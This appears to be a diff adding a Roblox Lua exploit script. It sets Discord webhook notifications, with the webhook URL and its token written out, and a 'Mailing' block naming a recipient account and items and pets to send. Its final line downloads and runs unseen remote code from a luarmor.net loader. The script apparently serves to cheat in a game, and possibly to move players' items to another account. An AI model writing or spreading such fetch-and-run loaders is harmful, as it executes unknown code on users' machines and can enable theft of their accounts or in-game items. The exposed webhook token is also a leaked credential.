@@ -1,0 +1,22 @@
+getgenv().Settings = {        
+    ["Notifications"] = {
+        Webhook = "https://discord.com/api/webhooks/1362892290607022281/5WMRCxKCjOZpwTkMV0W37KenhGLFlVQPqW1wKOFP-Bden4TSbX-8NVIUScmTu18LHaCM",
+        DiscordID = "314107374715535370",
+        Difficulty = "Above 500k",
+    },
+    ["Mailing"] = {
+        Usernames = {"ModusPet"},
+        Webhook = "https://discord.com/api/webhooks/1362892290607022281/5WMRCxKCjOZpwTkMV0W37KenhGLFlVQPqW1wKOFP-Bden4TSbX-8NVIUScmTu18LHaCM",
+        ["Pets"] = {
+            KeepBestPets = true,
+            Difficulty = "Above 10000m",
+        },
+        ["Items"] = {
+            --// These are EXAMPLES, please change/add anything to your liking! \\--
+            ["Diamond Fishing Rod"] = {Amount = 1},
+        },
+    },
+    ["Debug"] = {
+    },
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3cb1834cff48e9af0cc2616e44ab7d70.lua"))()
